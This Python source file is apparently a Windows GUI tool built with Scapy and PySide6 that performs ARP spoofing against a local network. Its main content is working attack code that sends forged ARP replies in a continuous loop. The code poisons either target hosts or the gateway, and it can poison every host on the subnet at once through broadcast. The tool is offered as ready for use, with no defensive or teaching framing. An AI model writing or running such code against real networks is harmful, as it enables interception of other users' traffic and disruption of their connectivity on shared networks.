import threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip
from scapy.arch.windows import get_windows_if_list
from PySide6.QtWidgets import QMessageBox


class CustomThread:
    def __init__(self, func):
        self.func = func

    def __call__(self, *args, **kwargs):
        def wrapper(*args, **kwargs):
            self.func(*args, **kwargs)
        threading.Thread(target=wrapper, args=args, kwargs=kwargs).start()


class NetworkManager:
    def __init__(self):
        pass

    def get_localhost(self) -> list:
        """ 获取本机ip列表 """
        return [j for i in get_windows_if_list() 
                if i['ips'] != []
                for j in i['ips']
                if len(j) >= 8
                if len(j) <= 15]

    def send_arp_packet(self, target_ip: str, target_mac: str, required_ip: str, false_mac: str, iface: str) -> None:
        """ 发送arp包 """
        packet_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=required_ip, hwsrc=false_mac)
        return sendp(packet_target, iface=iface, verbose=False)
    
    def get_iface_name(self, ip: str=None, mac: str=None) -> str:
        """ 根据ip或mac获取网卡名 """
        if not any([ip, mac]):
            raise ValueError("At least one of 'ip' or 'mac' must be provided.")
        if ip is not None:
            return [i['name'] for i in get_windows_if_list() if ip in i['ips']][0]
        if mac is not None:
            return [i['name'] for i in get_windows_if_list() if mac in i['mac']][0]


class InitUi(NetworkManager):
    def __init__(self, MyWindow):
        InitUi.self = self
        self.loop_status = False
        self.MyWindow = MyWindow
        self.MyWindow.ui.comboBox_localhost.addItems(super().get_localhost())
        self.MyWindow.ui.pushButton_gateway.clicked.connect(self.set_gateway)
        self.MyWindow.ui.pushButton_targethost.clicked.connect(self.set_targethost)
        self.MyWindow.ui.pushButton_start.clicked.connect(self.start_spoof)
        self.MyWindow.ui.pushButton_stop.clicked.connect(self.stop_spoof)
        self.MyWindow.ui.pushButton_help.clicked.connect(self.help)
        InitUi.self.logger('+', "初始化成功")

    @CustomThread
    def set_gateway():
        """ 设置网关 """
        try:
            current_value = InitUi.self.MyWindow.ui.comboBox_localhost.currentText()
            gateways = [i[2] for i in conf.route.routes if current_value in i if i[2] != "0.0.0.0"]
            InitUi.self.MyWindow.ui.lineEdit_gateway.setText(gateways[0])
            InitUi.self.logger('+', f"获取网关成功，网关为<address>{gateways[0]}</address>")
        except IndexError:
            InitUi.self.logger('-', "获取网关失败，可能未设置网关")
    
    @CustomThread
    def set_targethost():
        """ 设置目标主机 """
        InitUi.self.MyWindow.ui.lineEdit_targethost.setText('0.0.0.0')
        InitUi.self.logger('+', "目标主机设置为<address>0.0.0.0</address>")

    @CustomThread
    def start_spoof():
        if not InitUi.self.is_parameter(): return
        InitUi.self.toggle_editable()
        InitUi.self.loop_status = True
        if InitUi.self.MyWindow.ui.radioButton_one.isChecked():
            InitUi.self.poison_target_host(*InitUi.self.get_parameter_host())
        else:
            InitUi.self.poison_target_gateway(*InitUi.self.get_parameter_gateway())

    def poison_target_host(self, target_ip, target_mac, gateway_ip, local_mac):
        """
        主机型欺骗
        :param target_ip: 目标ip
        :param target_mac: 目标mac
        :param gateway_ip: 网关ip
        :param local_mac: 本地mac
        :return: None
        """
        InitUi.self.logger('+', f"启动主机型欺骗成功, 目标ip为<address>{target_ip}</address>, \
                           网关ip为<address>{gateway_ip}</address>, 本地mac为<address>{local_mac}</address>\
                            网卡为<address>{super().get_iface_name(mac=local_mac)}</address>")
        gateway_mac = getmacbyip(gateway_ip)
        while self.loop_status:
            super().send_arp_packet(target_ip, target_mac, gateway_ip, local_mac, super().get_iface_name(mac=local_mac))
            super().send_arp_packet(
                InitUi.self.MyWindow.ui.comboBox_localhost.currentText(), 
                local_mac, gateway_ip, gateway_mac, super().get_iface_name(mac=local_mac))
            self.counter()
    
    def poison_target_gateway(self, gateway_ip, gateway_mac, target_ip, local_mac):
        """
        网关型欺骗
        :param gateway_ip: 网关ip
        :param gateway_mac: 网关mac
        :param target_ip: 目标ip
        :param local_mac: 本地mac
        :return: None
        """
        InitUi.self.logger('+', f"启动网关型欺骗成功，目标ip为<address>{target_ip}</address>, 网关ip为<address>{gateway_ip}</address>, \
                            本地mac为<address>{local_mac}</address>, 网卡为<address>{super().get_iface_name(mac=local_mac)}</address>")
        while self.loop_status:
            super().send_arp_packet(gateway_ip, gateway_mac, target_ip, local_mac, super().get_iface_name(mac=local_mac))
            self.counter()

    def get_parameter_host(self) -> tuple[str, str, str, str]:
        target_ip = self.MyWindow.ui.lineEdit_targethost.text()
        target_mac = getmacbyip(target_ip)
        gateway_ip = self.MyWindow.ui.lineEdit_gateway.text()
        local_mac = [i['mac'] for i in get_windows_if_list() 
                     if self.MyWindow.ui.comboBox_localhost.currentText() in i['ips']][0]
        if target_ip == '0.0.0.0':
            target_mac = 'FF:FF:FF:FF:FF:FF'
        return target_ip, target_mac, gateway_ip, local_mac
    
    def get_parameter_gateway(self) -> tuple[str, str, str, str]:
        """
        获取参数
        :return: target_ip, target_mac, gateway_ip, local_mac
        """
        gateway_ip = self.MyWindow.ui.lineEdit_gateway.text()
        gateway_mac = getmacbyip(gateway_ip)
        target_ip = self.MyWindow.ui.lineEdit_targethost.text()
        local_mac = [i['mac'] for i in get_windows_if_list() 
                     if self.MyWindow.ui.comboBox_localhost.currentText() in i['ips']][0]
        return gateway_ip, gateway_mac, target_ip, local_mac


    def counter(self):
        self.MyWindow.ui.label_quantity.setText(str(int(self.MyWindow.ui.label_quantity.text())+1))
        return time.sleep(0.1)
    
    def is_parameter(self) -> bool:
        """ 检查参数 """
        for i in self.get_parameter_host():
            if i == '':
                InitUi.self.logger('-', "缺少参数，请输入正确的参数")
                return False
        return True
    
    @CustomThread
    def stop_spoof():
        """ 停止欺骗 """
        try: 
            InitUi.self.toggle_editable()
            InitUi.self.loop_status = False
            InitUi.self.logger('+', "停止成功")
        except:
            InitUi.self.logger('-', "停止失败")

    def toggle_editable(self):
        editable = not InitUi.self.MyWindow.ui.pushButton_start.isEnabled()
        InitUi.self.MyWindow.ui.pushButton_start.setEnabled(editable)
        InitUi.self.MyWindow.ui.pushButton_gateway.setEnabled(editable)
        InitUi.self.MyWindow.ui.pushButton_targethost.setEnabled(editable)
        InitUi.self.MyWindow.ui.radioButton_one.setEnabled(editable)
        InitUi.self.MyWindow.ui.radioButton_tow.setEnabled(editable)
        InitUi.self.MyWindow.ui.comboBox_localhost.setEnabled(editable)
        editable = not InitUi.self.MyWindow.ui.lineEdit_gateway.isReadOnly()
        InitUi.self.MyWindow.ui.lineEdit_gateway.setReadOnly(editable)
        InitUi.self.MyWindow.ui.lineEdit_targethost.setReadOnly(editable)

    def logger(self, state: str=None, msg: str=None) -> None:
        if state == '+':
            head = "<span style='font-size: 15px;color:green'>[<samp style='font-size: 15px;'>+</samp>] </span>"
        elif state == '-':
            head = "<span style='font-size: 15px;color:red'>[<samp style='font-size: 15px;'>-</samp>] </span>"
        else:
            head = "<span style='font-size: 15px;color:blue'>[<samp style='font-size: 15px;'>*</samp>] </span>"
        self.MyWindow.ui.textEdit_log.append(head + msg)
        self.MyWindow.ui.textEdit_log.ensureCursorVisible()
    
    def help(self):
        """ 帮助 """
        QMessageBox.information(self.MyWindow, "帮助", "主机模式下，目标地址为0.0.0.0时，将欺骗同网段下所有主机")


if __name__ == '__main__':
    arp = NetworkManager()
    # print(arp.send_arp_packet('192.168.164.10', 'BB:AA:CC:DD:EE:FF', '192.168.164.2', 'AA:96:E5:37:FC:A0'))
    print(arp.get_iface_name(mac='cc'))